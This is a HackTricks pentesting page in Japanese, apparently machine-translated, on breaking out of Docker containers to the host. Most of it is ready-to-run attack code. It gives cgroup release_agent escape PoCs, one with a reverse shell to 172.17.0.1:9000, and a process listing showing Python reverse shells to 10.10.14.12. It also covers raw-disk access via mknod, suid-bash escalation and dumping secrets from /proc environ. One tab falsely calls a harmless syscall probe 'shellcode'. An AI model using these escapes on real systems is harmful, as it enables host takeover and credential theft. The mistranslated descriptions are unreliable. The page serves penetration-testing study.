# Docker Breakout / 特権昇格

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または [**telegramグループ**](https://t.me/peass)に **参加** または **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)を **フォロー** してください。
* **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリに提出してください。

</details>

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) を使用して、世界で最も高度なコミュニティツールによって強化された **ワークフローを簡単に構築** および **自動化** します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## 自動列挙と脱出

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): **コンテナを列挙** することもできます
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): このツールは、 **現在のコンテナを列挙し、自動的に脱出を試みる** のに非常に便利です
* [**amicontained**](https://github.com/genuinetools/amicontained): コンテナが持つ権限を取得し、それから脱出方法を見つけるための便利なツール
* [**deepce**](https://github.com/stealthcopter/deepce): コンテナからの列挙と脱出のためのツール
* [**grype**](https://github.com/anchore/grype): イメージにインストールされているソフトウェアに含まれるCVEを取得する

## マウントされたDockerソケットの脱出

もし何らかの理由で **dockerソケットがコンテナ内にマウントされている** 場合、それから脱出することができます。\
これは通常、何らかの理由でdockerコンテナがdockerデーモンに接続してアクションを実行する必要がある場合に起こります。
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
この場合、通常のdockerコマンドを使用してdockerデーモンと通信できます：
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
**docker** ソケットが予期しない場所にある場合、**`docker`** コマンドをパラメータ **`-H unix:///path/to/docker.sock`** と共に使用してそれと通信することができます。
{% endhint %}

Docker デーモンはデフォルトでポート（通常は 2375、2376）でリスニングされている可能性があり、Systemd ベースのシステムでは Docker デーモンとの通信は Systemd ソケット `fd://` を介して行われることがあります。

{% hint style="info" %}
さらに、他のハイレベルランタイムのランタイムソケットにも注意してください:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Capabilities Abuse Escape

コンテナの権限をチェックすべきで、以下のいずれかの権限がある場合、それから脱出する可能性があります: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

現在のコンテナの権限を確認するには、**前述の自動ツール**または次の方法を使用できます:
```bash
capsh --print
```
## 特権コンテナからの脱出

特権コンテナは、次のようなフラグを使用して作成できます: `--privileged` または特定の防御を無効にすることで:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `/dev` をマウント

`--privileged` フラグは、コンテナのセキュリティを著しく低下させ、**制限なしのデバイスアクセス**を提供し、**いくつかの保護をバイパス**します。詳細な説明については、`--privileged` の完全な影響に関するドキュメントを参照してください。

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### 特権 + hostPID

これらの権限を持っていると、単に次のように実行するだけで、ホストで root として実行されているプロセス（init (pid:1) のような）の名前空間に移動できます: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

コンテナで実行してテストしてください:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### 特権

特権フラグだけで、ホストのディスクにアクセスを試みたり、release\_agentを悪用して脱出を試みることができます。

次のバイパスをコンテナで実行してテストしてください：
```bash
docker run --rm -it --privileged ubuntu bash
```
#### ディスクのマウント - Poc1

適切に構成されたDockerコンテナは**fdisk -l**のようなコマンドを許可しません。ただし、`--privileged`フラグや`--device=/dev/sda1`といった権限が指定されたミス構成のDockerコマンドでは、ホストドライブを見る権限を取得することが可能です。

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

したがって、ホストマシンを乗っ取ることは簡単です。
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
そして、ホストのファイルシステムにアクセスできるようになりました。なぜなら、`/mnt/hola`フォルダにマウントされているからです。

#### ディスクのマウント - Poc2

コンテナ内では、攻撃者はクラスターによって作成された書き込み可能なhostPathボリュームを介して、基礎となるホストOSへのさらなるアクセスを試みるかもしれません。以下は、この攻撃ベクトルを利用できるかどうかを確認するためにコンテナ内でチェックできる一般的なことです:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### 既存のrelease\_agentを悪用した特権エスケープ ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="初期 PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### 特権エスケープ created release_agent を悪用（[cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)）- PoC2

{% code title="セカンド PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

**技術の説明**は以下で見つけることができます：

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### release\_agentを悪用した特権エスケープ - 相対パスが不明な場合のPoC3

以前のエクスプロイトでは、**ホストのファイルシステム内のコンテナの絶対パスが公開**されていました。ただし、常にそうとは限りません。**ホスト内のコンテナの絶対パスがわからない**場合には、この技術を使用できます：

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
特権付きコンテナ内でPoCを実行すると、次のような出力が得られるはずです：
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### 特権エスケープ：機密マウントの悪用

いくつかのファイルがマウントされる可能性があり、**基礎となるホストに関する情報**を提供することがあります。それらの中には、**ホストが何かが起こったときに実行されるべきものを示す**ことさえあるかもしれません（これにより攻撃者がコンテナから脱出することが可能になります）。\
これらのファイルの悪用により、次のことが可能になるかもしれません：

- release\_agent（すでに前述済み）
- [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
- [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
- [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

ただし、このページでチェックすべき**他の機密ファイル**を見つけることができます：

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### 任意のマウント

何度かの機会に、**コンテナにホストからのボリュームがマウントされている**ことがあります。このボリュームが正しく構成されていない場合、**アクセス/変更が可能になる機密データ**があるかもしれません：シークレットの読み取り、sshのauthorized\_keysの変更...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 2つのシェルとホストマウントを使用した特権昇格

もし、ホストからマウントされたフォルダを持つ**コンテナ内のrootとしてアクセス**権がある場合、かつ**非特権ユーザーとしてホストに脱出**し、マウントされたフォルダに読み取りアクセス権がある場合、\
**コンテナ**内の**マウントされたフォルダ**に**bash suidファイル**を作成し、それを**ホスト**から実行することで特権昇格が可能です。
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 2つのシェルを使用した特権昇格

**コンテナ内でrootアクセス**がある場合、かつ**ホスト内で特権のないユーザーに昇格**した場合、コンテナ内でMKNODの機能（デフォルトで使用可能）を持っている場合、両方のシェルを悪用して**ホスト内で特権昇格**することができます。これは、[**この投稿で説明されています**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)。\
この機能を使用すると、コンテナ内のrootユーザーは**ブロックデバイスファイルを作成**することができます。デバイスファイルは、**基礎となるハードウェアやカーネルモジュールにアクセス**するために使用される特別なファイルです。たとえば、/dev/sdaブロックデバイスファイルは、**システムディスク上の生データを読む**ためのアクセスを提供します。

Dockerは、コンテナ内でのブロックデバイスの誤用に対して、**ブロックデバイスの読み書き操作をブロック**するcgroupポリシーを強制します。ただし、コンテナ内で**ブロックデバイスが作成**されると、**/proc/PID/root/**ディレクトリを介してコンテナ外からアクセスできるようになります。このアクセスには、プロセス所有者が**コンテナ内外で同じである必要**があります。

この[**解説**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/)からの**悪用**例：
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

ホストのプロセスにアクセスできる場合、それらのプロセスに格納されている多くの機密情報にアクセスできるようになります。テストラボを実行します：
```
docker run --rm -it --pid=host ubuntu bash
```
例えば、`ps auxn`のようなコマンドを使用してプロセスをリストアップし、コマンド内の機密情報を検索することができます。

その後、**/proc/ホスト内の各プロセスにアクセスできるため、単にその環境変数の秘密を盗むことができます**。次のように実行します：
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
あなたはまた、**他のプロセスのファイルディスクリプタにアクセスして、それらのオープンファイルを読む**ことができます：
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
あなたはまた**プロセスを終了させ、DoSを引き起こす**ことができます。

{% hint style="warning" %}
もし何らかの方法でコンテナの外部のプロセスに特権的な**アクセス権**がある場合、`nsenter --target <pid> --all`や`nsenter --target <pid> --mount --net --pid --cgroup`のようなコマンドを実行して、そのプロセスと同じns制限（たぶんなし）を持つシェルを**実行**できます。
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
もしコンテナがDocker [ホストネットワーキングドライバ(`--network=host`)](https://docs.docker.com/network/host/)で構成されている場合、そのコンテナのネットワークスタックはDockerホストから分離されていません（コンテナはホストのネットワーキング名前空間を共有しており、コンテナには独自のIPアドレスが割り当てられません）。言い換えると、**コンテナはすべてのサービスを直接ホストのIPにバインド**します。さらに、コンテナは共有インターフェース`tcpdump -i eth0`でホストが送受信している**すべてのネットワークトラフィックを傍受**できます。

例えば、これを使用してホストとメタデータインスタンス間のトラフィックを**スニッフィングやスプーフィング**することができます。

以下の例のように：

- [解説: Google SREに連絡する方法: Cloud SQLにシェルをドロップする](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [メタデータサービスのMITMによるルート特権昇格（EKS / GKE）](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

また、ホスト内で**localhostにバインドされたネットワークサービスにアクセス**したり、**ノードのメタデータ権限にアクセス**したりすることもできます（これはコンテナがアクセスできるものとは異なる場合があります）。

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
`hostIPC=true`を使用すると、ホストのプロセス間通信（IPC）リソースにアクセスできます。たとえば、`/dev/shm`内の**共有メモリ**にアクセスできます。これにより、他のホストやポッドプロセスが同じIPCリソースを使用している場所に読み書きできます。これらのIPCメカニズムをさらに調査するには、`ipcs`を使用します。

* **/dev/shmの調査** - この共有メモリの場所にあるファイルを調べます：`ls -la /dev/shm`
* **既存のIPC施設の調査** - `/usr/bin/ipcs`を使用して、IPC施設が使用されているかどうかを確認できます。次のコマンドを使用して確認します：`ipcs -a`

### 機能の回復

シスコール**`unshare`**が禁止されていない場合、次のコマンドを実行してすべての機能を回復できます：
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### シンボリックリンクを介したユーザー名前空間の悪用

[https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) で説明されている2番目のテクニックは、ユーザー名前空間でバインドマウントを悪用して、ホスト内のファイルに影響を与える方法を示しています（特定のケースでは、ファイルを削除します）。

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) を使用して、世界で最も先進的なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## CVE

### Runc exploit (CVE-2019-5736)

`docker exec`をrootとして実行できる場合（おそらくsudoで）、CVE-2019-5736を悪用してコンテナから特権を昇格させることを試みることができます（[こちら](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)にエクスプロイトがあります）。このテクニックは基本的に、**ホスト内の**_**/bin/sh**_バイナリを**コンテナから上書き**するものであり、docker execを実行すると誰でもペイロードをトリガーできます。

ペイロードを適切に変更し、`go build main.go`でmain.goをビルドします。生成されたバイナリは、実行のためにdockerコンテナに配置する必要があります。\
実行時に、`[+] Overwritten /bin/sh successfully`と表示されると、ホストマシンから次のコマンドを実行する必要があります：

`docker exec -it <container-name> /bin/sh`

これにより、main.goファイルに存在するペイロードがトリガーされます。

詳細については: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
コンテナが脆弱である可能性のある他のCVEがあります。リストは[こちら](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)で見つけることができます。
{% endhint %}

## Dockerカスタムエスケープ

### Dockerエスケープサーフェス

* **名前空間:** プロセスは名前空間を介して**他のプロセスと完全に分離**されている必要があります。そのため、名前空間によって他のプロセスとのやり取りから脱出することはできません（デフォルトではIPC、Unixソケット、ネットワークサービス、D-Bus、他のプロセスの`/proc`を介して通信できません）。
* **ルートユーザー:** プロセスを実行しているユーザーはデフォルトでルートユーザーです（ただし、権限は制限されています）。
* **機能:** Dockerは次の機能を残します：`cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscall:** これらは**ルートユーザーが呼び出せないシスコール**です（機能の不足+Seccompのため）。他のシスコールを使用して脱出を試みることができます。

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 システムコール" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}syscall_bf.cファイルは、Dockerコンテナ内で実行される特権昇格攻撃のためのシェルコードを含んでいます。この攻撃は、Linuxカーネルのシステムコールを悪用して、Dockerコンテナからホストマシンに特権昇格することを可能にします。攻撃者はこの手法を使用して、Dockerコンテナのセキュリティを回避し、ホストシステムに侵入することができます。{% endtab %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
